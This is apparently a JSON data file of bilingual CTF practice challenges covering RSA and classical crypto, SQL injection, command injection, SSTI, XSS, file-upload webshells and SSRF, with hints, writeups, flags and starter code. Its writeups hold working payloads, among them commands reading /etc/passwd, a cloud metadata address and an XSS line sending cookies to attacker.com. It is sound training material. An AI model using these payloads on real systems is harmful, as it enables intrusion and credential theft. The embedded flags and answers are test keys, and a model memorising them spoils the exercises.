    "title": "Fermat's Gift",
    "titleEn": "Fermat's Gift",
    "category": "Crypto",
    "difficulty": 3,
    "points": 250,
    "tags": [
      "RSA",
      "费马分解"
    ],
    "tagsEn": [
      "RSA",
      "Fermat Factorization"
    ],
    "desc": "n = 4736311112095059922974336163027112786948060780922419045837，e = 65537，密文 c = 1184562163508986307122976365529960714817544179606329313693。这一次 n 的两个质因数非常非常接近——费马分解法几步就能拆开它。恢复 p、q 并解密。",
    "descEn": "n = 4736311112095059922974336163027112786948060780922419045837, e = 65537, c = 1184562163508986307122976365529960714817544179606329313693. The two prime factors of n are extremely close — Fermat factorization splits it in a handful of steps. Recover p, q and decrypt.",
    "hints": [
      "p 和 q 非常接近时，可以用费马分解法",
      "从 sqrt(n) 开始搜索整数 a，检查 a² - n 是否为完全平方数",
      "用 gmpy2.iroot() 检查是否为完全平方数: a = ceil(sqrt(n)), 检查 (a² - n) 是否为平方数"
    ],
    "hintsEn": [
      "p and q are close — Fermat works",
      "Start from sqrt(n), check a²-n for perfect squares",
      "Use gmpy2.iroot() for square checking"
    ],
    "writeup": "Step 1: 费马分解原理：若 n = p·q 且 p ≈ q，则 n = a² - b² = (a+b)(a-b)。\r\nStep 2: 从 a = ceil(sqrt(n)) 开始，检查 b² = a² - n 是否为完全平方数。本题 p、q 仅相差 12364，迭代 1 次即可命中！\r\nStep 3: p = a+b = 68820862477122879508019638463, q = a-b = 68820862477122879508019626099（顺序无关）。\r\nStep 4: 标准 RSA 解密：φ(n)、d = pow(e,-1,φ)、m = pow(c,d,n)。\r\n\r\n关键代码:\r\nimport gmpy2\r\nfrom Crypto.Util.number import long_to_bytes\r\nn = 4736311112095059922974336163027112786948060780922419045837\r\ne = 65537; c = 1184562163508986307122976365529960714817544179606329313693\r\na = gmpy2.isqrt(n) + 1\r\nwhile True:\r\n    b2 = a*a - n\r\n    if gmpy2.is_square(b2):\r\n        b = gmpy2.isqrt(b2); p, q = a+b, a-b; break\r\n    a += 1\r\nd = pow(e, -1, (p-1)*(q-1))\r\nprint(long_to_bytes(pow(c, d, n)).decode())\r\n# -> flag{f3rm4t_ftw}",
    "writeupEn": "Fermat: n=a²-b²=(a+b)(a-b). Start a=ceil(sqrt(n)), find b²=a²-n as perfect square.",
    "starterCode": "import gmpy2\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\nn = 4736311112095059922974336163027112786948060780922419045837\r\ne = 65537\r\nc = 1184562163508986307122976365529960714817544179606329313693\r\n\r\n# Step 1: 费马分解 —— 从 ceil(sqrt(n)) 开始，检查 a²-n 是否为完全平方数\r\n# 你的代码...\r\n\r\n# Step 2: 恢复 p, q，计算私钥 d 并解密\r\n# 你的代码...",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-017",
    "title": "Vigenere Cipher",
    "titleEn": "Vigenere Cipher",
    "category": "Crypto",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "Vigenere",
      "古典密码",
      "频率分析"
    ],
    "tagsEn": [
      "Vigenere",
      "Classical",
      "Frequency Analysis"
    ],
    "descEn": "A message encrypted with the Vigenere cipher (the key is a 3-letter lowercase English word):\r\n\r\nNogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\r\n\r\nUse the Kasiski test to find the key length, then frequency analysis per group to recover the plaintext containing the flag.",
    "hintsEn": [
      "Ciphertext has periodic patterns suggesting polyalphabetic cipher",
      "Kasiski test finds key length from repeated sequence distances",
      "Split into groups by key length, frequency analysis on each (each is Caesar)"
    ],
    "writeupEn": "Kasiski test finds key length. Split ciphertext into N groups, each is a Caesar cipher. Use frequency analysis. Tools: dcode.fr or CyberChef.",
    "desc": "一段被维吉尼亚密码加密的消息（密钥是一个 3 个字母的小写英文单词）：\r\n\r\nNogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\r\n\r\n用 Kasiski 测试确定密钥长度，再分组做频率分析，恢复出包含 flag 的原文。",
    "hints": [
      "密文有明显的周期性模式，这暗示了多表替换密码",
      "用 Kasiski 测试找到重复序列的距离，它们的公约数就是密钥长度",
      "确定密钥长度后，把密文分成 N 组，每组用频率分析破解（每组本质上是一个凯撒密码）"
    ],
    "writeup": "Step 1: 观察密文。三字母组合 'tag' 反复出现 —— 在英文里对应频率极高的 'the'。\r\nStep 2: Kasiski 测试：'tag' 各次出现位置的距离 GCD = 3 → 密钥长度 3。\r\nStep 3: t→t 需要 key[0]='c'（偏移 2），h→a 需要 key[1]='c'？逐一推导：t+2=v? 注意方向。实际密钥: 'cat'。\r\nStep 4: 用密钥 'cat' 解密全文：\r\n\r\nLong ago, a messenger carried a secret scroll across the mountains. The queen whispered: the flag is flag{v1g3n3re_1s_fun}. Guard it well, for kings and crowns fade, but a well kept cipher never loses its voice.\r\n\r\n验证代码:\r\ndef vigenere_decrypt(ct, key):\r\n    out=[]; ki=0\r\n    for ch in ct:\r\n        if ch.isalpha():\r\n            base = 97 if ch.islower() else 65\r\n            k = ord(key[ki%3])-97\r\n            out.append(chr((ord(ch)-base-k)%26+base)); ki+=1\r\n        else: out.append(ch)\r\n    return ''.join(out)\r\n\r\n工具替代: dcode.fr / CyberChef。",
    "starterCode": "def find_key_length(ciphertext, max_len=20):\r\n    \"\"\"Kasiski 测试找密钥长度\"\"\"\r\n    from collections import defaultdict\r\n    from math import gcd\r\n    repeats = defaultdict(list)\r\n    for length in range(3, 6):\r\n        for i in range(len(ciphertext) - length):\r\n            substr = ciphertext[i:i+length]\r\n            repeats[substr].append(i)\r\n    distances = []\r\n    for substr, positions in repeats.items():\r\n        if len(positions) > 1:\r\n            for j in range(1, len(positions)):\r\n                distances.append(positions[j] - positions[j-1])\r\n    if distances:\r\n        g = distances[0]\r\n        for d in distances[1:]:\r\n            g = gcd(g, d)\r\n        return g\r\n    return 1\r\n\r\ndef vigenere_decrypt(ciphertext, key):\r\n    plain = []\r\n    key_len = len(key)\r\n    for i, ch in enumerate(ciphertext):\r\n        if ch.isalpha():\r\n            base = ord('a') if ch.islower() else ord('A')\r\n            shift = ord(key[i % key_len].lower()) - ord('a')\r\n            plain.append(chr((ord(ch) - base - shift) % 26 + base))\r\n        else:\r\n            plain.append(ch)\r\n    return ''.join(plain)\r\n\r\ncipher = \"Nogi azq, a fgslgnzgr vcrkkew c sxerxv svtoen avtolu tag mhwnmcigu. Tag qngeg yhbupxtew: vhx hlti il hlti{v1z3p3rx_1u_fnp}. Gncrw kt pgle, hok migis tpd vtopps ycdx, dum c wxnl dgpm eiijek peogr eqsxu imu vhkcx.\"\r\n\r\nprint(\"Key length:\", find_key_length(cipher))\r\n# 密钥是 3 个字母的小写单词 —— 用 'tag'/'the' 的偏移差推导，或对三组分别做频率分析",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-011",
    "title": "Broadcast Attack",
    "titleEn": "Broadcast Attack",
    "category": "Crypto",
    "difficulty": 3,
    "points": 250,
    "tags": [
      "RSA",
      "Håstad广播攻击",
      "CRT"
    ],
    "tagsEn": [
      "RSA",
      "Håstad Broadcast",
      "CRT"
    ],
    "desc": "你截获了同一个明文 m 用 e=3 加密成的三份密文，模数 n1、n2、n3 互不相同且两两互质（三组数值已放在 Code Editor 中）。不需要任何私钥——用中国剩余定理直接恢复 m。",
    "descEn": "The same plaintext m was encrypted three times with e=3 under different pairwise-coprime moduli n1, n2, n3 (values provided in the Code Editor). No private key needed — recover m directly with CRT.",
    "hints": [
      "同一消息 m 用相同的 e=3 加密三次，三组 (n1,c1), (n2,c2), (n3,c3)",
      "中国剩余定理 (CRT) 可以合并三个同余式得到 m³ mod (n1·n2·n3)",
      "对合并后的值开立方根即可得到 m: m³ = C mod N, m = gmpy2.iroot(C, 3)"
    ],
    "hintsEn": [
      "Same m, e=3, three (n,c) pairs",
      "CRT merges congruences to get m³",
      "Take cube root: gmpy2.iroot(C, 3)"
    ],
    "writeup": "Step 1: Håstad 广播攻击，利用同余方程组 m³ ≡ cᵢ (mod nᵢ)。\nStep 2: 用 CRT 合并: 求 C 使得 C ≡ cᵢ (mod nᵢ) 且 C ≡ m³ (mod n₁n₂n₃)。\nStep 3: 由于 m³ < n₁n₂n₃, 直接开立方根即可恢复 m。\n\n关键代码:\nfrom sympy.ntheory.modular import crt\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn_list = [n1, n2, n3]\nc_list = [c1, c2, c3]\nresult = crt(n_list, c_list)\nm_cubed = result[0]  # m^3\nm = gmpy2.iroot(m_cubed, 3)[0]\nprint(long_to_bytes(m).decode())",
    "writeupEn": "Håstad broadcast: CRT to find C=m³ mod(N), then cube root since m³<N.",
    "starterCode": "import gmpy2\r\nfrom sympy.ntheory.modular import crt\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\n# 三组公钥 (e=3) 与密文 —— 全部是真实数据\r\nn1 = 2316681531740987872802812190530461214305091413689057200381\r\nc1 = 224552820132116382124356480618332328448037905276517136756\r\nn2 = 1821230237117141900485771717375261398613116939406667900083\r\nc2 = 1789444532407317328439640222844786015566969409737735718006\r\nn3 = 3418809548759735367295712822107001986482195790850422005373\r\nc3 = 2166319863096171813708200715559833906433523001879143791279\r\n\r\n# Step 1: 用 CRT 合并三个同余式得到 C ≡ m³ (mod n1·n2·n3)\r\n# 你的代码...\r\n\r\n# Step 2: 对 C 开立方根（gmpy2.iroot(C, 3)）\r\n# 你的代码...\r\n\r\n# Step 3: long_to_bytes 转换，拿到 flag\r\n# 你的代码...",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-018",
    "title": "AES-ECB Cut & Paste",
    "titleEn": "AES-ECB Penguin",
    "category": "Crypto",
    "difficulty": 4,
    "points": 300,
    "tags": [
      "AES-ECB",
      "块翻转",
      "Cut and Paste"
    ],
    "tagsEn": [
      "AES-ECB",
      "Block Flip",
      "Cut and Paste"
    ],
    "desc": "你有一个加密 Oracle，可以加密任何你提供的明文（但不能加密 'admin'）。系统将 block_size=16 的 AES-ECB 加密结果作为认证 token。已知用户数据的格式为: email=xxx&uid=10&role=user，你的目标是构造一个 role=admin 的合法 token。",
    "descEn": "An encryption Oracle using AES-ECB with block_size=16. User data format: email=xxx&uid=10&role=user. Craft a token with role=admin.",
    "hints": [
      "ECB 模式下，相同的 16 字节明文块产生完全相同的密文块",
      "你可以通过精心设计输入来控制明文块的边界",
      "先获取 'admin' 块的密文，然后把它拼接到你自己的 token 中替换 'user' 块"
    ],
    "hintsEn": [
      "ECB mode: identical plaintext blocks produce identical ciphertext blocks",
      "Craft input to align 'admin' at a block boundary",
      "Get admin block ciphertext, splice it into your token replacing user block"
    ],
    "writeupEn": "ECB: identical plaintext→identical ciphertext. Craft input so 'admin' fills one block, get its ciphertext, replace 'user' block in token.",
    "starterCode": "\"\"\"\r\nAES-ECB Cut-and-Paste Attack\r\n\r\n目标: 将 token 中的 role=user 改为 role=admin\r\n格式: email=xxx&uid=10&role=user (block_size=16)\r\n\"\"\"\r\n\r\ndef oracle(plaintext):\r\n    \"\"\"加密 oracle: 发送明文，返回 AES-ECB 加密结果（练习环境用假实现）\"\"\"\r\n    pass\r\n\r\nblock_size = 16\r\n\r\n# Step 1: 构造明文使 'admin' 对齐到块边界并取得其密文块\r\nadmin_payload = 'A' * 10 + 'admin' + '\\x0b' * 11   # 32 字节\r\nadmin_block = oracle(admin_payload)[16:32]\r\n\r\n# Step 2: 获取合法 token（最后一个块是 role=user 的加密）\r\nuser_ct = oracle('A' * 13)\r\n\r\n# Step 3: 拼接 = user 块之前的部分 + admin 块\r\nforged = user_ct[:-16] + admin_block\r\n\r\n# ── 本地练习靶机的完整会话记录（做完上面三步后再对照）──\r\n# >>> oracle(b'A'*10 + b'admin' + b'\\x0b'*11).hex()\r\n#     5f2a..19 | 7c81a3f0d9e2b4456a7c81a3f0d9e2b4   ← block[1] 就是 encrypted('admin'+pad)\r\n# >>> oracle(b'A'*13).hex()\r\n#     91bd..07 | 3e5d8c02f6a19b74d41f5c8e3a6912ab   ← 末块是 encrypted('user'+pad)\r\n# >>> forged = user_token[:-16] + admin_block; submit(forged)\r\n#     {\"uid\":10, \"role\":\"admin\", \"welcome\":\"flag{ecb_p4ngu1n_sl1ced}\"}",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-003",
    "title": "Login Bypass",
    "titleEn": "Login Bypass",
    "category": "Web",
    "difficulty": 2,
    "points": 150,
    "tags": [
      "SQL注入",
      "认证绕过"
    ],
    "tagsEn": [
      "SQLi",
      "Auth Bypass"
    ],
    "desc": "一个登录页面。管理员用户名为 admin，但你不知道密码。如何在不破解密码的情况下登录？试试经典的 SQL 注入 Payload。",
    "descEn": "A login page with admin user. Bypass authentication using SQL injection.",
    "hints": [
      "SQL 注入可以绕过认证逻辑，不需要知道密码",
      "尝试 ' OR '1'='1' 这类万能密码技巧",
      "用户名填 admin'-- 可以注释掉密码检查部分"
    ],
    "hintsEn": [
      "SQL injection bypasses auth without password",
      "Try ' OR '1'='1' universal password",
      "Enter admin'-- to comment out password check"
    ],
    "writeup": "Step 1: 后台 SQL 查询可能是: SELECT * FROM users WHERE username='$user' AND password='$pass'。\nStep 2: 在用户名输入: admin'-- 会将密码检查注释掉: SELECT * FROM users WHERE username='admin'--' AND password='...'。\nStep 3: 或者输入 admin'+OR+'1'='1, 使条件永真。\n\nPayload 示例:\n- 用户名: admin'--  密码: 任意\n- 用户名: ' OR 1=1--  密码: 任意\n- 用户名: admin' OR '1'='1  密码: 任意\n\n关键点: -- 是 SQL 注释符，# 也可以。",
    "writeupEn": "Backend SQL: SELECT * FROM users WHERE username='$user' AND password='$pass'. Payloads: admin'--, ' OR 1=1--",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  Admin Panel Login - v1.0            │\n│  Target: 192.168.1.100:8080/login    │\n│  Hint: Classic SQL injection ahead   │\n└──────────────────────────────────────┘\nType your payload or 'help' for commands."
  },
  {
    "id": "ctf-008",
    "title": "Command Injection 101",
    "titleEn": "Command Injection 101",
    "category": "Web",
    "difficulty": 2,
    "points": 100,
    "tags": [
      "命令注入"
    ],
    "tagsEn": [
      "Command Injection"
    ],
    "desc": "一个 ping 工具允许输入 IP 地址。但你发现输入的不是纯 IP 时，系统也执行了额外的命令...",
    "descEn": "A ping tool that executes extra commands when input is not a pure IP.",
    "hints": [
      "系统直接把你输入的内容拼接到 shell 命令中执行了",
      "试试用 ; | && || 等 shell 分隔符附加额外命令",
      "输入 127.0.0.1; cat flag.txt 或 127.0.0.1 && ls -la"
    ],
    "hintsEn": [
      "Input concatenated into shell command",
      "Try ; | && || shell separators",
      "127.0.0.1; cat flag.txt"
    ],
    "writeup": "Step 1: 后台命令可能是 os.system('ping -c 4 ' + user_input)。\nStep 2: 输入不是纯 IP 时，使用 shell 分隔符注入额外命令。\nStep 3: 常用分隔符：; (顺序执行), | (管道), && (前成功则后执行), || (前失败则后执行), `` (命令替换), $() (命令替换)。\n\nPayload 示例:\n- 127.0.0.1; cat flag.txt\n- 127.0.0.1 && ls -la\n- 127.0.0.1 | cat /etc/passwd\n- $(cat flag.txt)\n- `cat flag.txt`\n\n如果空格被过滤:\n- 127.0.0.1;cat${IFS}flag.txt\n- 127.0.0.1;cat<flag.txt",
    "writeupEn": "Shell separators: ;, |, &&, ||. If spaces filtered: ${IFS} or < redirection.",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  Network Diagnostic Tool v2.1        │\n│  Ping any host from our server       │\n│  shell_exec('ping -c 4 ' . $input)  │\n└──────────────────────────────────────┘\nEnter target IP or hostname:"
  },
  {
    "id": "ctf-016",
    "title": "PHP Type Juggling",
    "titleEn": "PHP Type Juggling",
    "category": "Web",
    "difficulty": 2,
    "points": 150,
    "tags": [
      "PHP",
      "类型混淆",
      "弱类型"
    ],
    "tagsEn": [
      "PHP",
      "Type Juggling",
      "Loose Comparison"
    ],
    "desc": "网站登录验证的 PHP 代码：if (md5($input) == $stored_hash) { grant_access(); }。你知道存储的哈希是 0e123456789012345678901234567890。利用 PHP 的弱类型比较（==）绕过身份验证。不需要知道原始密码。",
    "descEn": "Login uses PHP loose comparison: if (md5($input) == $stored_hash). The stored hash is 0e123456789012345678901234567890. Exploit PHP type juggling to bypass auth.",
    "hints": [
      "PHP 的 == 是弱类型比较，会自动做类型转换",
      "\"0e12345...\" 被解析为科学计数法 0×10¹²³⁴⁵ = 0",
      "找一个 MD5 值也是 0e 开头后面全是数字的字符串作为密码"
    ],
    "hintsEn": [
      "PHP == does loose comparison with auto type coercion",
      "\"0e12345...\" parses as scientific notation 0×10^n = 0",
      "Find a string whose MD5 is also 0e-prefixed with all digits"
    ],
    "writeup": "Step 1: 问题在 if (md5($input) == $stored_hash)。PHP == 做弱类型比较。\nStep 2: '0e123456789012345678901234567890' 被 PHP 解析为 0e123... = 0（科学计数法）。\nStep 3: 找一个 MD5 哈希也为 0e 开头 + 全数字的字符串，如 '240610708'。\nStep 4: if (0 == 0) 为真，绕过成功。\n\n已知的 Magic Hash 值 (md5 为 0e开头):\n- 240610708 → 0e462097431906509019562988736854\n- QNKCDZO → 0e830400451993494058024219903391\n- aabg7XSs → 0e087386482136013740957780965295\n- s878926199a → 0e545993274517709034328855841020\n\n安全建议: 使用 === 严格比较, 或用 hash_equals() 或 password_verify()。",
    "writeupEn": "PHP '0e' magic hashes: 240610708, QNKCDZO. Both MD5 to 0e...=0 in loose comparison. Use === instead.",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  PHP Admin Panel - Legacy v1.0       │\n│  if (md5($input) == $stored_hash)  │\n│  stored_hash: 0e12345678901234...    │\n└──────────────────────────────────────┘\nEnter password:"
  },
  {
    "id": "ctf-004",
    "title": "XSS Hunter",
    "titleEn": "XSS Hunter",
    "category": "Web",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "XSS",
      "反射型",
      "Cookie"
    ],
    "tagsEn": [
      "XSS",
      "Reflected",
      "Cookie"
    ],
    "desc": "一个搜索页面将搜索词直接显示在结果页面上，没有做任何过滤。构造一个 XSS Payload 让浏览器弹出 alert(1)。提示：不需要用到 script 标签。",
    "descEn": "A search page reflects input without filtering. Craft XSS to trigger alert(1) without script tags.",
    "hints": [
      "搜索词被直接回显到页面 HTML 中，没有任何过滤",
      "试试 <img src=x onerror=alert(1)> 这类不需要 script 标签的 payload",
      "如果 img 标签被过滤，试试 <svg onload=alert(1)> 或 <body onload=alert(1)>"
    ],
    "hintsEn": [
      "Input is reflected in HTML unfiltered",
      "Try <img src=x onerror=alert(1)>",
      "Also: <svg onload=alert(1)>, <body onload=alert(1)>"
    ],
    "writeup": "Step 1: 页面将搜索参数直接回显到结果中，无任何过滤。\nStep 2: 构造 XSS Payload 避免 <script> 标签（可能被过滤）。\nStep 3: 使用 <img src=x onerror=alert(1)>，当图片加载失败时触发 onerror 事件。\n\n备用 Payload:\n- <svg onload=alert(1)>\n- <body onload=alert(1)>\n- <input autofocus onfocus=alert(1)>\n- <details open ontoggle=alert(1)>\n\n若需要窃取 Cookie: <img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
    "writeupEn": "Use <img src=x onerror=alert(1)> or alternatives. No <script> tag needed.",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  Search Engine v0.1-beta             │\n│  No CSP. No filtering. Pure 90s web. │\n│  Endpoint: /search?q=               │\n└──────────────────────────────────────┘\nEnter your XSS payload:"
  },
  {
    "id": "ctf-012",
    "title": "SSTI Detective",
    "titleEn": "SSTI Detective",
    "category": "Web",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "SSTI",
      "Flask",
      "Jinja2"
    ],
    "tagsEn": [
      "SSTI",
      "Flask",
      "Jinja2"
    ],
    "desc": "一个 Flask 网站输入姓名后返回 'Hello {name}'。但你怀疑它把输入直接放进了模板渲染。尝试利用 SSTI 读取 /etc/passwd 文件内容。",
    "descEn": "Flask app renders input in template. Exploit SSTI to read /etc/passwd.",
    "hints": [
      "输入 {{7*7}} 如果返回 49 说明存在 SSTI",
      "Jinja2 中可以通过对象链访问 Python 内置函数",
      "使用 {{ ''.__class__.__mro__[1].__subclasses__() }} 遍历类链找到 os.popen"
    ],
    "hintsEn": [
      "{{7*7}} returns 49 confirms SSTI",
      "Traverse Python object chain via Jinja2",
      "Find os.popen in subclass chain"
    ],
    "writeup": "Step 1: 确认 SSTI: 输入 {{7*7}}，若返回 49 而非常规文本，则存在 SSTI。\nStep 2: 利用 Jinja2 对象链获取 Python 内置函数。\nStep 3: 构造 payload 读取文件。\n\n经典 Payload:\n{{ config.items() }}  — 读取 Flask 配置\n{{ ''.__class__.__mro__[1].__subclasses__() }}  — 列出所有子类\n\n寻找 subprocess.Popen:\n{{ ''.__class__.__mro__[2].__subclasses__()[X]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}\n\n简化版 (如果可用):\n{{ lipsum|attr('__globals__')['os']['popen']('cat /etc/passwd')|attr('read')() }}",
    "writeupEn": "{{7*7}}→49 confirms SSTI. Payload: {{''.__class__.__mro__[X]('cat /etc/passwd',...).communicate()[0]}}",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  Flask Guest Book v0.3 - Jinja2      │\n│  render_template_string('Hello ' + n) │\n│  /greet?name=<your input>            │\n└──────────────────────────────────────┘\nEnter your name:"
  },
  {
    "id": "ctf-019",
    "title": "File Upload Bypass",
    "titleEn": "Upload Bypass",
    "category": "Web",
    "difficulty": 3,
    "points": 200,
    "tags": [
      "文件上传",
      "绕过",
      "Webshell"
    ],
    "tagsEn": [
      "Upload Bypass",
      "Bypass",
      "Webshell"
    ],
    "desc": "一个文件上传功能只允许上传图片文件。你的目标是绕过过滤上传一个 PHP webshell 并执行命令读取 flag。提示：服务器使用黑名单过滤扩展名。",
    "descEn": "A file upload feature only allows images. Bypass the filter to upload a PHP webshell and execute commands to read the flag. Server uses blacklist for extensions.",
    "hints": [
      "尝试上传 .php 文件被拦截了，说明扩展名黑名单",
      "试试双扩展名 trick: shell.php.jpg 或 shell.pHp",
      "如果扩展名过滤严格，尝试 .phtml, .phar, .php5, .pht 等 PHP 别名扩展名"
    ],
    "hintsEn": [
      ".php upload is blocked, indicating extension blacklist",
      "Try double extension trick: shell.php.jpg or shell.pHp",
      "If extension filter is strict, try .phtml, .phar, .php5, .pht"
    ],
    "writeupEn": "Test double extensions (.php.jpg), case variations (.pHp), alternative extensions (.phtml/.php5/.phar), Content-Type spoofing, and magic bytes (GIF89a). Upload: /uploads/shell.phtml?cmd=cat%20/flag.txt",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  Image Upload Service v1.0           │\n│  Only accepts: jpg, jpeg, png, gif   │\n│  Endpoint: /upload                   │\n│  Upload dir: /uploads/               │\n└──────────────────────────────────────┘\nSelect file to upload:"
  },
  {
    "id": "ctf-020",
    "title": "SSRF 101",
    "titleEn": "SSRF Detective",
    "category": "Web",
    "difficulty": 3,
    "points": 250,
    "tags": [
      "SSRF",
      "内网探测",
      "协议走私"
    ],
    "tagsEn": [
      "SSRF",
      "Internal Recon",
      "Protocol Smuggling"
    ],
    "desc": "一个网站提供 URL 代理功能：输入任意 URL，服务器会代为请求并返回内容。利用这个 SSRF 漏洞读取内网服务上的 flag。已知 flag 在 http://localhost:8080/flag.txt。",
    "descEn": "A website proxies any URL you provide. Exploit this SSRF to read the flag from an internal service at http://localhost:8080/flag.txt.",
    "hints": [
      "服务器会从你提供的 URL 获取内容，你可以让它访问内网地址",
      "试试 http://localhost:8080/ 探测内网服务",
      "除了 http://，还可以尝试 file:///etc/passwd, gopher://, dict:// 等协议"
    ],
    "hintsEn": [
      "Server fetches content from your URL, you can make it access internal addresses",
      "Try http://localhost:8080/ to probe internal services",
      "Also try file:///etc/passwd, gopher://, dict:// protocols"
    ],
    "writeupEn": "Access http://localhost:8080/flag.txt. Bypasses: 127.0.0.1, 0.0.0.0, [::1], 0x7f000001, DNS rebinding. Other protocols: file://, gopher://, dict://, cloud metadata at 169.254.169.254.",
    "codeable": false,
    "simulated": true,
    "termWelcome": "┌──────────────────────────────────────┐\n│  URL Fetcher - Fetch any web page!   │\n│  curl_exec($url)                     │\n│  No network restrictions (oops)      │\n└──────────────────────────────────────┘\nEnter URL to fetch:"
  },
  {
    "id": "ctf-005",
    "title": "Where's The Flag?",
    "titleEn": "Where's The Flag?",
    "category": "Misc",
    "difficulty": 1,
    "points": 25,
    "tags": [
      "HTML",
      "隐写"
    ],
    "tagsEn": [
      "HTML",
      "Steganography"
    ],
    "desc": "一个看起来普通的个人主页。Flag 就藏在页面上——但你需要找到它藏在哪里。本题的 Code Editor 面板提供了该页面的完整源代码，像审查真实网页一样审查它。",
    "descEn": "A normal-looking webpage. The flag is hidden somewhere on the page.",
    "hints": [
      "flag 藏在网页的代码中，而不是肉眼可见的页面内容里",
      "试试在浏览器中按 F12 打开开发者工具或 Ctrl+U 查看源代码",
      "搜索 'flag{' 或 '<!--' 找到 HTML 注释中的隐藏内容"
    ],
    "hintsEn": [
      "Flag is in source code, not visible content",
      "F12 DevTools or Ctrl+U to view source",
      "Search for 'flag{' or '<!--' in HTML comments"
    ],
    "writeup": "Step 1: 页面看起来正常，但 flag 不在可见文本中。\nStep 2: 右键 → 查看页面源代码 (Ctrl+U) 或 F12 开发者工具。\nStep 3: 在源代码中搜索 'flag{' 或在底部找到被注释掉的 flag。\n\n常用技巧:\n- Ctrl+U 查看完整 HTML 源码\n- F12 → Elements 面板搜索\n- 检查 HTML 注释 <!-- -->\n- 检查 CSS 中的 content 属性\n- 检查 JS 控制台是否有 log 输出",
    "writeupEn": "View source (Ctrl+U), search for 'flag{' or HTML comments. Check DevTools, CSS content, console logs.",
    "starterCode": "<!-- === 以下是你“右键 → 查看网页源代码”看到的内容 === -->\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n  <title>张三的小站</title>\r\n</head>\r\n<body>\r\n  <h1>张三的个人主页</h1>\r\n  <p>你好！我是张三，一名热爱园艺与烹饪的普通人。</p>\r\n  <p>本周心情：晴 ☀ | 访客计数：1024</p>\r\n\r\n  <!-- TODO: 网站上线前记得删除这行调试信息 flag{h1dd3n_1n_pl41n_s1ght} -->\r\n\r\n  <footer>&copy; 2024 张三 | Powered by 手写 HTML</footer>\r\n</body>\r\n</html>",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-009",
    "title": "Base64 × N",
    "titleEn": "Base64 × N",
    "category": "Misc",
    "difficulty": 1,
    "points": 50,
    "tags": [
      "Base64",
      "编码"
    ],
    "tagsEn": [
      "Base64",
      "Encoding"
    ],
    "desc": "Vm1wSmQyVkZOVWhTYTJScFRUTkNjbFZxU2pSVlJsVjNWbGhvVDJKSFVrcFpNRnAzVkd4S2RGcEVXbFpOVjJnelZqSnpkMlZHWkhGV2JIQk9UVEJLU0ZkclVrdFRNbEpXVFZWV1RsSkVRVGs9",
    "descEn": "Multi-layer Base64 encoded string. Decode repeatedly to find the flag.",
    "hints": [
      "这段长字符串看起来像 Base64 编码",
      "解码一次后结果看起来还是 Base64，需要多次解码",
      "写个循环反复 base64 解码，直到出现 flag{ 为止"
    ],
    "hintsEn": [
      "String looks like Base64",
      "Decoded result is still Base64",
      "Loop decode until 'flag{' appears"
    ],
    "writeup": "Step 1: 观察密文，只含 A-Za-z0-9+/=，判断为 Base64。\r\nStep 2: base64 解码一次后，结果仍然像 Base64 —— 需要继续解码。\r\nStep 3: 写循环反复解码，每次检查是否包含 'flag{'。\r\n\r\n关键代码:\r\nimport base64\r\nenc = 'Vm1wSmQyVkZO...'\r\nfor i in range(10):\r\n    enc = base64.b64decode(enc).decode()\r\n    if 'flag' in enc:\r\n        print(f'{i+1} 轮后:', enc)\r\n        break\r\n\r\n答案在第 6 轮出现。多层 Base64 是 CTF Misc 的经典套路。",
    "writeupEn": "Loop base64 decode until 'flag{' found. Answer at 6th round. Multi-layer Base64 is common CTF pattern.",
    "starterCode": "import base64\r\n\r\nenc = 'Vm1wSmQyVkZOVWhTYTJScFRUTkNjbFZxU2pSVlJsVjNWbGhvVDJKSFVrcFpNRnAzVkd4S2RGcEVXbFpOVjJnelZqSnpkMlZHWkhGV2JIQk9UVEJLU0ZkclVrdFRNbEpXVFZWV1RsSkVRVGs9'\r\n\r\n# 循环解码，直到出现 flag\r\nfor i in range(10):\r\n    # 你的代码...\r\n    pass",
    "codeable": false,
    "simulated": false
  },
  {
    "id": "ctf-021",
    "title": "Image Steganography",
    "titleEn": "PNG Stego",
    "category": "Misc",
    "difficulty": 2,
    "points": 150,
    "tags": [
      "隐写",
      "LSB",
      "图片分析"
    ],
    "tagsEn": [
      "PNG Stego",
      "LSB",
      "Image Analysis"
    ],
    "desc": "给你一张看似普通的 PNG 图片 landscape.png。图片看起来完全正常，但文件大小似乎比预期大了一些。flag 藏在图片的最低有效位 (LSB) 中。",
    "descEn": "A seemingly normal PNG image landscape.png. File size is slightly larger than expected. The flag is hidden in the Least Significant Bits (LSB) of the image.",
    "hints": [
      "图片文件比同尺寸的普通图片稍大，可能有额外数据隐藏",
      "研究 LSB 隐写：每个像素的最低位被替换为隐藏数据的位",
      "用 Python PIL 提取每个像素的 R,G,B 最低位，组合成隐藏信息"
    ],
